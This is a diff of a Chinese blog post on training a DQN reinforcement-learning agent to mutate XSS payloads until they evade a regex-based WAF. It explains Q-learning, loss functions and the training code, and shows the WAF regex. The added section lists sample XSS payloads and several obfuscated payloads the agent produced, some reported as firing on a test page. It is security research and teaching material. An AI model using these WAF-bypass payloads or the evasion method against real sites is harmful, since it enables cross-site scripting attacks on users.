@@ -10,7 +10,7 @@ DQN实际上就是Q learning+network
 
 那先来看看Q learning，公式如下：
 
-![image-20250320103940595](https://s2.loli.net/2025/03/21/zY3ZCDt8I5K9fML.png)
+![image-20250320103940595](https://s2.loli.net/2025/06/03/tq5wPhJUFC26f7B.png)
 
 ```
 Q(S_t, A_t)即当前状态下动作A_t的Q值,为待更新值
@@ -99,7 +99,7 @@ def learn(self, s, a, r, s_):
       self.q_table.loc[s, a] += self.lr * (q_target - q_predict)
 ```
 
-这段代码就是公式![image-20250320103940595](https://s2.loli.net/2025/03/21/zY3ZCDt8I5K9fML.png)
+这段代码就是公式![image-20250320103940595](https://s2.loli.net/2025/06/03/tq5wPhJUFC26f7B.png)
 
 的具体实现过程，让我着重关注一下q_target和q_predict，q_target 是下一个状态的最大Q值，q_predict是当前状态的Q值，这个公式的目的就是使当前状态尽可能的去你和下一状态，计算下一状态和当前状态Q值的差，再乘以折扣率Gamma（即是这个误差存在一定损失），再乘上学习率alpha，这样就可以逐步的去拟合下一状态的Q值，讲到这里是不是有神经网络梯度下降那味儿了
 
@@ -130,7 +130,7 @@ B.同样的道理，把在线网络去拟合target网络这个过程比作是打
 
 1.**在线网络训练**：在线网络和环境交互，在线网络执行了一个动作，环境会返回（状态、动作、奖励、新状态、新动作）然后使用这些数据来更新网络参数，我们希望在线网络的预测值接近于目标值，我们可以使用梯度下降算法来最小化在线网络预测的Q值和目标网络的目标值之间的差距（通常使用平方损失函数）。
 
-![image-20250320140741459](https://s2.loli.net/2025/03/21/c1N72vQSfXboICO.png)
+![image-20250320140741459](https://s2.loli.net/2025/06/03/VK8wNuqrcbUAQED.png)
 
 Q值的更新公式为：
 
@@ -272,7 +272,7 @@ if __name__ == '__main__':
 
 除开这两个重要的，还有接受DQNAgent命令执行具体免杀操作的XSS_Manipulator模块，正则检测的WAF模块，还有一个Features特征提取模块，下图是整个流程图：
 
-![image-20250320160058395](https://s2.loli.net/2025/03/21/D3mFI1v5Lxt2PC7.png)
+![image-20250320160058395](https://s2.loli.net/2025/06/03/j4KtiNAR6zHgshq.png)
 
 那接下来讲讲features模块
 
@@ -325,7 +325,7 @@ if __name__ == '__main__':
 
 这里用公式解释一下：
 
-神经网络的参数更新公式：![image-20250320163054703](https://s2.loli.net/2025/03/21/2vfOX7V6eFcpq9h.png)
+神经网络的参数更新公式：![image-20250320163054703](https://s2.loli.net/2025/06/03/IT58PrM7Yh3VOLS.png)
 
 其中：
 
@@ -333,14 +333,14 @@ if __name__ == '__main__':
 - alphaα 是学习率（learning rate）
 - L 是损失函数
 
-在反向传播（Backpropagation）时，权重的梯度计算：![image-20250320163228638](https://s2.loli.net/2025/03/21/vXQ82MK4dqwxgpU.png)
+在反向传播（Backpropagation）时，权重的梯度计算：![image-20250320163228638](https://s2.loli.net/2025/06/03/V4hPw5WocUOyGCb.png)
 
 其中：
 
--  ![image-20250320163455087](https://s2.loli.net/2025/03/21/3uVdPpvNOkf62Bh.png)由损失函数决定
--  ![image-20250320163512148](https://s2.loli.net/2025/03/21/h8owJrYADcnbxtf.png)由输入数据的特征值决定
+-  ![image-20250320163455087](https://s2.loli.net/2025/06/03/CWMS6zlTmoBnyax.png)由损失函数决定
+-  ![image-20250320163512148](https://s2.loli.net/2025/06/03/raoeugDR7vwVpSy.png)由输入数据的特征值决定
 
-如果特征x的数值范围过大（例如 1000），那么梯度计算时：![image-20250320163628676](https://s2.loli.net/2025/03/21/JfVCtgR9hprwcsm.png)
+如果特征x的数值范围过大（例如 1000），那么梯度计算时：![image-20250320163628676](https://s2.loli.net/2025/06/03/RngGqwM1NeTWU4K.png)
 
 梯度就会变得很大，导致：
 
@@ -825,7 +825,7 @@ repaly经验重放那里前面已经讲了很多了，没什么好说的了
 
 值得注意的是我这里在梯度下降时使用的是mse来计算损失函数
 
-![image-20250320212138855](https://s2.loli.net/2025/03/21/hriZGg2k6RBuD5C.png)
+![image-20250320212138855](https://s2.loli.net/2025/06/03/fM5SzFgjDWAXZ8v.png)
 
 ## 损失函数
 
@@ -873,7 +873,7 @@ repaly经验重放那里前面已经讲了很多了，没什么好说的了
 
 ### 回归任务 vs. 二分类任务
 
-均方误差（MSE，Mean Squared Error）：![image-20250320220112842](https://s2.loli.net/2025/03/21/YpaH2KSQvJWBse3.png)
+均方误差（MSE，Mean Squared Error）：![image-20250320220112842](https://s2.loli.net/2025/06/03/RU2wa958XpZguBx.png)
 
 回归任务可以根据公式来看，主要是数值逼近问题，所以均方误差用来衡量预测值和真实值的误差再合适不过
 
@@ -883,7 +883,7 @@ repaly经验重放那里前面已经讲了很多了，没什么好说的了
 
 二元交叉熵（Binary Crossentropy, BCE）：
 
-公式：![image-20250320214656558](https://s2.loli.net/2025/03/21/mdptNirL7ajPvyE.png)
+公式：![image-20250320214656558](https://s2.loli.net/2025/06/03/kbGte6B2sRPDNAS.png)
 
 想必大家在刚接触时都有疑惑，为什么分类任务不用均方误差？
 
@@ -906,3 +906,280 @@ repaly经验重放那里前面已经讲了很多了，没什么好说的了
 可以看到如果使用二元交叉熵的话，越接近0或1，值越小
 
 但均方误差因为是线性的，所以 0.9 预测 1 ， 0.5 预测 1 的损失这两个的损失变化不大，这对于分类任务来说是致命的
+
+## 实践
+
+上面讲了本项目的实现原理，那就下来就来点实战吧
+
+### 训练数据概述与示例
+
+本项目的训练数据存储在 xss-samples-all.txt 文件中，包含一系列XSS（跨站脚本攻击）payload。这些payload是强化学习环境的初始样本，供DQN智能体训练使用。目标是让智能体学习通过修改这些payload（例如字符转码、插入注释等操作）来绕过WAF的检测
+
+
+
+xss-samples-all.txt 文件包含多种XSS攻击样本，涵盖常见和复杂的payload，如```<script>alert(1);</script>```,```<img src=xss onerror=alert(1)>```等。这些样本模拟了现实中可能用于攻击的恶意脚本
+
+接着来看几个简单的示例
+
+1.简单脚本注入
+
+```<script>alert(123);</script>```
+
+**特征**：包含 <、>、s、c、r、i、p、t、a、l、e 等字符，特征向量中这些ASCII码的频率较高，字符串长度为22
+
+**WAF检测**：Waf_Check 的正则表达式会匹配 alert 和 script，标记为恶意
+
+**智能体目标**：可能通过 charTo16 将 a 转为``` &#x61;``` 或 addComment 插入 ```/*4444*/ ```来绕过检测
+
+
+
+2.事件触发
+
+```<img src=xss onerror=alert(1)>```
+
+**说明**：利用``` <img> ```标签的 onerror 事件在图片加载失败时执行 alert(1)
+
+**特征**：包含 i、m、g、o、n、e、r、r 等字符，长度为28，特征向量中 = 和空格的频率较高
+
+**WAF检测**：正则匹配 onerror 和 alert，标记为恶意
+
+**智能体目标**：可能通过 addZero 插入 \00 或 charTo16 将 o 转为 ```&#x6F;```
+
+
+
+3.复杂编码
+
+```<SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>```
+
+**说明**：使用 String.fromCharCode 动态构造 alert(1)，尝试通过编码绕过WAF
+
+**特征**：包含大量数字、逗号、括号，长度较长（约60），特征向量中数字和标点的频率较高
+
+**WAF检测**：正则匹配 String.fromCharCode，仍会被拦截
+
+**智能体目标**：可能通过 addEnter 插入换行符或 charTo10 将部分字符转为十进制编码
+
+
+
+4.HTML5特性
+
+```<svg/onload=alert(1)>```
+
+**说明**：利用SVG标签的 onload 事件触发XSS，针对现代浏览器的HTML5特性
+
+**特征**：短小精悍（长度20），包含 s、v、g、o、n、l 等字符，/ 和 = 频率较高
+
+**WAF检测**：匹配 onload 和 alert，标记为恶意
+
+**智能体目标**：可能通过 addComment 插入注释或 charTo16 将 s 转为 ```&#x73;```
+
+
+
+由于本项目免杀模块中的免杀方法并不是很好，这里仅提供一个思路，想提升智能体性能的，师傅们可以自行加入你们的小trick哦
+
+
+
+
+
+来看看在项目中主要哪些地方用到了训练数据
+
+**环境初始化**：在 env.py 中，reset 方法从训练集（samples_train）中随机选择一个XSS payload作为初始样本，提供给智能体作为起点。
+
+**特征提取**：每个payload通过 Features 类的 extract 方法转换为257维特征向量（1维长度 + 256维ASCII字符频率），作为智能体的状态输入
+
+**奖励机制**：智能体通过 Xss_Manipulator 修改payload，并由 Waf_Check 检测是否绕过WAF。若绕过成功，智能体获得10分奖励，驱动其学习有效的免杀策略
+
+
+
+### 数据处理
+
+那接着具体看看数据处理部分吧，其实上面的原理解释部分已经讲得很清楚啦，还是在这里讲讲吧
+
+
+
+**加载与分割**：
+
+在 env.py 中，代码通过以下方式加载和分割数据：
+
+```py
+samples_file = "/Users/guyuwei/security_ai/大佬项目/ItBaizhan/代码/waf_agent/envs/xss-samples-all.txt"
+samples = []
+with open(samples_file) as f:
+    for line in f:
+        line = line.strip('\n')
+        samples.append(line)
+samples_train, samples_test = train_test_split(samples, test_size=0.4)
+```
+
+这里使用 sklearn.model_selection.train_test_split 将样本分为训练集（60%）和测试集（40%），训练集用于智能体学习，测试集可用于后续评估
+
+
+
+**特征提取**：
+
+Features 类的 extract 方法将每个字符串转换为257维向量
+
+```py
+def extract(self, str):
+    bytes = [ord(c) for c in list(str)]
+    h = np.bincount(bytes, minlength=256)
+    h_norm = np.concatenate([
+        [h.sum().astype(self.dtype)],
+        h.astype(self.dtype).flatten() / h.sum().astype(self.dtype)
+    ])
+    return h_norm
+```
+
+ord(c) 将字符转为ASCII码，np.bincount 统计每个ASCII值的频率，生成256维向量
+
+向量归一化（除以字符串长度）并拼接字符串长度，形成257维特征，确保数值稳定性（这步十分重要，在上面的原理解释部分已解释清楚，这里就不过多提及了，我们主要来理理训练流程）
+
+
+
+这里的数据处理不难，使用np.bincount 统计每个ASCII值的频率，生成256维向量来提取数据信息，在本项目中已经够用了，如果师傅们想进一步训练的话，可以在特征提取上下一些功夫，提供几种思路：使用transformer的encoder来提取特征，使用LSTM长短期记忆网络也行（相较transformer而言，效果欠佳）
+
+### 开始训练
+
+1.状态初始化
+
+在 Env 类的 reset 方法中，随机选择一个训练样本作为初始payload：
+
+```py
+def reset(self, seed=None, options=None):
+    self.current_sample = random.choice(samples_train)
+    observation = self.features.extract(self.current_sample)
+    return observation
+```
+
+每次回合开始，环境从 samples_train 中抽取一个XSS payload（如 ```<script>alert(123);</script>```）通过 Features.extract 转换为257维特征向量，作为智能体的初始状态,这确保智能体在多样化的XSS样本上学习，而不是局限于单一类型
+
+
+
+2.驱动动作选择
+
+在 step 方法中，智能体根据当前状态选择动作，调用 Xss_Manipulator 修改payload：
+
+```py
+def step(self, action):
+    _action = ACTION_LOOKUP[action]
+    modified_sample = self.xss_manipulator.modify(self.current_sample, _action)
+    ...
+    observation = self.features.extract(modified_sample)
+    return observation, r, done, truncated, {}
+```
+
+**动作**：如 charTo16、addComment 等，修改后的payload（如 <scr&#x69;pt>alert(123);</script>）生成新的特征向量
+
+**状态转移**：新特征向量成为下一状态，反映payload的变化,为了训练数据的多样性（如脚本注入、事件触发、编码混淆）迫使智能体学习针对不同模式的最佳修改策略
+
+
+
+3.奖励计算
+
+Waf_Check 检测修改后的payload是否绕过WAF，决定奖励：
+
+```py
+if not self.waf_check.check_xss(modified_sample):
+    r = 10  # 免杀成功，奖励10分
+    print(repr(f'免杀成功！,原样本:{self.current_sample},免杀样本:{modified_sample}'))
+```
+
+如果修改后的payload未被WAF拦截（如正则未匹配 alert），智能体获得10分奖励
+
+训练数据的复杂性（如大小写混淆、编码方式）让智能体探索更隐蔽的免杀方法，优化Q值
+
+
+
+主要的训练流程就是：waf环境和智能体相互对抗，智能体根据waf环境的反馈不断学习生成更好的有效的payload，waf环境接受这些payload过后进行检验返回新的状态给智能体
+
+
+
+看看刚刚提到的waf
+
+```py
+import re
+
+class Waf_Check(object):
+    def __init__(self):
+        self.regXSS = r'(prompt|alert|confirm|expression])' \
+                      r'|(javascript|script|eval)' \
+                      r'|(onload|onerror|onfocus|onclick|ontoggle|onmousemove|ondrag)' \
+                      r'|(String.fromCharCode)' \
+                      r'|(;base64,)' \
+                      r'|(onblur=write)' \
+                      r'|(xlink:href)' \
+                      r'|(color=)'
+
+    def check_xss(self, str):
+        flag = False
+        if re.search(self.regXSS, str, re.IGNORECASE):
+            flag = True
+        return flag
+
+#测试
+if __name__ == '__main__':
+    waf_check = Waf_Check()
+    print(waf_check.check_xss('alert(1);'))
+```
+
+这里的waf写的不复杂，对于我们的智能体来说绕过就是小case
+
+
+
+整体流程就是这样了，那开始训练，看看效果吧
+
+
+
+先来看看训练的输出吧(图是随机截取的，生成的payload不一定能触发xss)
+
+![image-20250508221045483](https://s2.loli.net/2025/05/08/G9LIceHN2ap7wYm.png)
+
+![image-20250508221146934](https://s2.loli.net/2025/05/08/bTHkLIKwZ2rcGJg.png)
+
+![image-20250508221222109](https://s2.loli.net/2025/06/03/KoA7QtYOGj5upNZ.png)
+
+
+
+这里写了一个简单的测试页面
+
+![image-20250508215639078](https://s2.loli.net/2025/05/08/a2woZl8BKGeSXcR.png)
+
+这里的话没有写一个智能体和测试页面的交互功能
+
+所以直接人工用智能体生成的一些xss来测试一下
+
+使用```<oBjeCt datA="j&#x09;a&#x0a;&#x56;&#x09;a&#x09;s&#x09;C&#x09;r&#x09;i&#x0a;p&#x0a;t&colon;&#97;&#108;ert()&semi;">```试试
+
+不行
+
+![image-20250508220107863](https://s2.loli.net/2025/05/08/9x7te2TWgjIi14C.png)
+
+
+
+这是前期生成的payload，试试后面轮次生成的payload
+
+```<scRiPt>import('data:text/javascript,alert()')</sCRiPt>```
+
+成功！
+
+![image-20250508220316952](https://s2.loli.net/2025/05/08/3PTl9aoKAuR46Xs.png)
+
+
+
+再多试试几个
+
+```<ifRamE sRcdOC="&lt;img src=1 onerror=&apos;alert()'>"></ifRame>```
+
+```<A Href="&#x4a;&#x0a;a&#x0a;v&#x0a;A&#x0a;s&#x0a;C&#x09;R&#x09;i&#x0a;p&#x09;t&colon;aler&#116;()&semi;">XSS</a>```
+
+成功！
+
+![image-20250508215939857](https://s2.loli.net/2025/05/08/vyOfK7npimlx9c3.png)
+
+![image-20250508220420505](https://s2.loli.net/2025/05/08/mbi6PlznEfDcd4u.png)
+
+## 总结
+
+这个项目只是初期阶段，还有很多可以完善的地方，比如智能体的大脑我们这里只使用了简单的全连接层，还可以使用长短期记忆网络和transformer的编码器来学习更复杂的绕过方式，还有不足之处是这里的waf写的很简单，不能很好的应用等实际的环境中，提出上述的不足，希望诸君可以在此上完善
+
+最最重要的是：整个项目就不方便写在这里了，需要代码的话，来我的github取吧https://github.com/ignite0522/waf-agent
